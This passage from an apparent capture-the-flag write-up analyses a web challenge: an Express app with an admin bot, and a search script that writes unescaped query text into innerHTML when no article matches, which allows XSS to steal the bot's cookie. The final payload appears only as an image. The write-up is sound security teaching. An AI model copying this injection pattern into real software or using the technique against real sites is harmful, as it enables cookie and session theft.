</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">67</span><span class="">    </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">68</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">69</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">70</span><span class="">app</span><span class="token punctuation">.</span><span class="token method function property-access">get</span><span class="token punctuation">(</span><span class="token string">&#x27;/&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">(</span><span class="token parameter">req</span><span class="token parameter punctuation">,</span><span class="token parameter"> res</span><span class="token punctuation">)</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">71</span><span class="">    res</span><span class="token punctuation">.</span><span class="token method function property-access">render</span><span class="token punctuation">(</span><span class="token string">&#x27;index&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">72</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">73</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">74</span><span class="">app</span><span class="token punctuation">.</span><span class="token method function property-access">get</span><span class="token punctuation">(</span><span class="token string">&#x27;/report&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">(</span><span class="token parameter">req</span><span class="token parameter punctuation">,</span><span class="token parameter"> res</span><span class="token punctuation">)</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">75</span><span class="">    res</span><span class="token punctuation">.</span><span class="token method function property-access">render</span><span class="token punctuation">(</span><span class="token string">&#x27;report&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">76</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">77</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">78</span><span class="">app</span><span class="token punctuation">.</span><span class="token method function property-access">post</span><span class="token punctuation">(</span><span class="token string">&#x27;/report&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">(</span><span class="token parameter">req</span><span class="token parameter punctuation">,</span><span class="token parameter"> res</span><span class="token punctuation">)</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">79</span><span class="">    </span><span class="token keyword">const</span><span class=""> url </span><span class="token operator">=</span><span class=""> req</span><span class="token punctuation">.</span><span class="token property-access">body</span><span class="token punctuation">.</span><span class="token property-access">url</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">80</span><span class="">    </span><span class="token keyword">const</span><span class=""> name </span><span class="token operator">=</span><span class=""> </span><span class="token function">format</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class=""> </span><span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;yyMMdd_HHmmss&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">81</span><span class="">    </span><span class="token function">startBot</span><span class="token punctuation">(</span><span class="">url</span><span class="token punctuation">,</span><span class=""> name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">82</span><span class="">    res</span><span class="token punctuation">.</span><span class="token method function property-access">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">send</span><span class="token punctuation">(</span><span class="token template-string template-punctuation string">`</span><span class="token template-string string">logs/</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">name</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">.log</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">83</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">84</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">85</span><span class="">app</span><span class="token punctuation">.</span><span class="token method function property-access">listen</span><span class="token punctuation">(</span><span class="">port</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">86</span><span class="">    </span><span class="token console class-name">console</span><span class="token punctuation">.</span><span class="token method function property-access">log</span><span class="token punctuation">(</span><span class="token template-string template-punctuation string">`</span><span class="token template-string string">App running at http://0.0.0.0:</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">port</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">87</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div></div>
<p>Seemingly, the server sets up a simple &quot;admin bot&quot; whose cookie we need to extract via XSS.</p>
<p>But where is the XSS vulnerability? Looking in the script loaded by <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">index.ejs</code>,</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0V0zm22.034 18.276c-.175-1.095-.888-2.015-3.003-2.873-.736-.345-1.554-.585-1.797-1.14-.091-.33-.105-.51-.046-.705.15-.646.915-.84 1.515-.66.39.12.75.42.976.9 1.034-.676 1.034-.676 1.755-1.125-.27-.42-.404-.601-.586-.78-.63-.705-1.469-1.065-2.834-1.034l-.705.089c-.676.165-1.32.525-1.71 1.005-1.14 1.291-.811 3.541.569 4.471 1.365 1.02 3.361 1.244 3.616 2.205.24 1.17-.87 1.545-1.966 1.41-.811-.18-1.26-.586-1.755-1.336l-1.83 1.051c.21.48.45.689.81 1.109 1.74 1.756 6.09 1.666 6.871-1.004.029-.09.24-.705.074-1.65l.046.067zm-8.983-7.245h-2.248c0 1.938-.009 3.864-.009 5.805 0 1.232.063 2.363-.138 2.711-.33.689-1.18.601-1.566.48-.396-.196-.597-.466-.83-.855-.063-.105-.11-.196-.127-.196l-1.825 1.125c.305.63.75 1.172 1.324 1.517.855.51 2.004.675 3.207.405.783-.226 1.458-.691 1.811-1.411.51-.93.402-2.07.397-3.346.012-2.054 0-4.109 0-6.179l.004-.056z"></path></svg> <!-- -->js<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token comment">// Implements search functionality, filtering articles to display only those matching the search words (considering whole words case-insensitive matches)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token keyword">function</span><span class=""> </span><span class="token function">getSearchQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">    </span><span class="token keyword">const</span><span class=""> params </span><span class="token operator">=</span><span class=""> </span><span class="token keyword">new</span><span class=""> </span><span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token dom variable">window</span><span class="token punctuation">.</span><span class="token property-access">location</span><span class="token punctuation">.</span><span class="token property-access">search</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">    </span><span class="token comment">// Utiliser une valeur par défaut de chaîne vide si le paramètre n&#x27;existe pas</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">    </span><span class="token keyword control-flow">return</span><span class=""> params</span><span class="token punctuation">.</span><span class="token method function property-access">get</span><span class="token punctuation">(</span><span class="token string">&#x27;q&#x27;</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">?</span><span class=""> params</span><span class="token punctuation">.</span><span class="token method function property-access">get</span><span class="token punctuation">(</span><span class="token string">&#x27;q&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">:</span><span class=""> </span><span class="token string">&#x27;&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class=""></span><span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token method function property-access">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#x27;DOMContentLoaded&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">    </span><span class="token keyword">const</span><span class=""> searchQuery </span><span class="token operator">=</span><span class=""> </span><span class="token function">getSearchQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">    </span><span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token method function property-access">getElementById</span><span class="token punctuation">(</span><span class="token string">&#x27;search-input&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token property-access">value</span><span class=""> </span><span class="token operator">=</span><span class=""> searchQuery</span><span class="token punctuation">;</span><span class=""> 
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">    </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">searchQuery</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">        </span><span class="token function">searchArticles</span><span class="token punctuation">(</span><span class="">searchQuery</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">    </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">16</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class=""></span><span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token method function property-access">getElementById</span><span class="token punctuation">(</span><span class="token string">&#x27;search-icon&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#x27;click&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class="">    </span><span class="token function">searchArticles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">20</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">21</span><span class=""></span><span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token method function property-access">getElementById</span><span class="token punctuation">(</span><span class="token string">&#x27;search-input&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#x27;keypress&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="">    </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">event</span><span class="token punctuation">.</span><span class="token property-access">key</span><span class=""> </span><span class="token operator">===</span><span class=""> </span><span class="token string">&#x27;Enter&#x27;</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">23</span><span class="">        </span><span class="token function">searchArticles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="">    </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">25</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">26</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class=""></span><span class="token keyword">function</span><span class=""> </span><span class="token function">searchArticles</span><span class="token punctuation">(</span><span class="">searchInput </span><span class="token operator">=</span><span class=""> </span><span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token method function property-access">getElementById</span><span class="token punctuation">(</span><span class="token string">&#x27;search-input&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token property-access">value</span><span class="token punctuation">.</span><span class="token method function property-access">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">28</span><span class="">    </span><span class="token keyword">const</span><span class=""> searchWords </span><span class="token operator">=</span><span class=""> searchInput</span><span class="token punctuation">.</span><span class="token method function property-access">split</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex char-class char-class-punctuation punctuation">[</span><span class="token regex regex-source language-regex char-class char-class-negation operator">^</span><span class="token regex regex-source language-regex char-class char-set class-name">\p{L}</span><span class="token regex regex-source language-regex char-class char-class-punctuation punctuation">]</span><span class="token regex regex-source language-regex quantifier number">+</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">29</span><span class="">    </span><span class="token keyword">const</span><span class=""> articles </span><span class="token operator">=</span><span class=""> </span><span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token method function property-access">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">&#x27;.article-box&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">30</span><span class="">    </span><span class="token keyword">let</span><span class=""> found </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">false</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">31</span><span class="">    articles</span><span class="token punctuation">.</span><span class="token method function property-access">forEach</span><span class="token punctuation">(</span><span class="token parameter">article</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">32</span><span class="">        </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">searchInput </span><span class="token operator">===</span><span class=""> </span><span class="token string">&#x27;&#x27;</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">33</span><span class="">            article</span><span class="token punctuation">.</span><span class="token property-access">style</span><span class="token punctuation">.</span><span class="token property-access">display</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">34</span><span class="">            found </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">true</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">35</span><span class="">        </span><span class="token punctuation">}</span><span class=""> </span><span class="token keyword control-flow">else</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">36</span><span class="">            </span><span class="token keyword">const</span><span class=""> articleText </span><span class="token operator">=</span><span class=""> article</span><span class="token punctuation">.</span><span class="token property-access">textContent</span><span class="token punctuation">.</span><span class="token method function property-access">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">37</span><span class="">            </span><span class="token keyword">const</span><span class=""> isMatch </span><span class="token operator">=</span><span class=""> searchWords</span><span class="token punctuation">.</span><span class="token method function property-access">some</span><span class="token punctuation">(</span><span class="token parameter">word</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> word </span><span class="token operator">&amp;&amp;</span><span class=""> </span><span class="token keyword">new</span><span class=""> </span><span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token template-string template-punctuation string">`</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">word</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;ui&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">test</span><span class="token punctuation">(</span><span class="">articleText</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">38</span><span class="">            </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">isMatch</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">39</span><span class="">                article</span><span class="token punctuation">.</span><span class="token property-access">style</span><span class="token punctuation">.</span><span class="token property-access">display</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">40</span><span class="">                found </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">true</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">41</span><span class="">            </span><span class="token punctuation">}</span><span class=""> </span><span class="token keyword control-flow">else</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">42</span><span class="">                article</span><span class="token punctuation">.</span><span class="token property-access">style</span><span class="token punctuation">.</span><span class="token property-access">display</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;none&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">43</span><span class="">            </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">44</span><span class="">        </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">45</span><span class="">    </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">46</span><span class="">    </span><span class="token keyword">const</span><span class=""> noMatchMessage </span><span class="token operator">=</span><span class=""> </span><span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token method function property-access">getElementById</span><span class="token punctuation">(</span><span class="token string">&#x27;no-match-message&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">47</span><span class="">    </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="token operator">!</span><span class="">found </span><span class="token operator">&amp;&amp;</span><span class=""> searchInput</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">48</span><span class="">        noMatchMessage</span><span class="token punctuation">.</span><span class="token property-access">innerHTML</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token template-string template-punctuation string">`</span><span class="token template-string html language-html">No results for &quot;</span><span class="token template-string html language-html interpolation interpolation-punctuation punctuation">${</span><span class="token template-string html language-html interpolation">searchInput</span><span class="token template-string html language-html interpolation interpolation-punctuation punctuation">}</span><span class="token template-string html language-html">&quot;.</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">49</span><span class="">        noMatchMessage</span><span class="token punctuation">.</span><span class="token property-access">style</span><span class="token punctuation">.</span><span class="token property-access">display</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;block&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">50</span><span class="">    </span><span class="token punctuation">}</span><span class=""> </span><span class="token keyword control-flow">else</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">51</span><span class="">        noMatchMessage</span><span class="token punctuation">.</span><span class="token property-access">style</span><span class="token punctuation">.</span><span class="token property-access">display</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;none&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">52</span><span class="">    </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">53</span><span class=""></span><span class="token punctuation">}</span></code></pre></div></div>
<p>The idea seems to be that</p>
<ul>
<li>The page automatically populates <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">search-input</code> with our passed-in query string.</li>
<li>For each &quot;word&quot; (tokens separated by <a href="https://www.regular-expressions.info/unicode.html#prop">characters not in the unicode letter category</a>) in our query, we perform a case-insensitive Regex match against the text of each article on the page.</li>
<li>If no matches are found, we get direct <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">innerHTML</code> access -&gt; XSS.</li>
</ul>
<p>But there&#x27;s one last problem; the page&#x27;s articles look like this:</p>
<p><img src="https://gist.github.com/user-attachments/assets/9d840a9b-e1df-4c45-90b5-e9fddd514ea0" alt="image"/></p>
<p>so we need to be careful about choosing an XSS payload that doesn&#x27;t match any of the banned tokens above. Looking <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">online</a>, one such payload is</p>
<p><img src="https://gist.github.com/user-attachments/assets/b74639aa-e387-4e0a-af9c-166eaee374f5" alt="image"/></p>
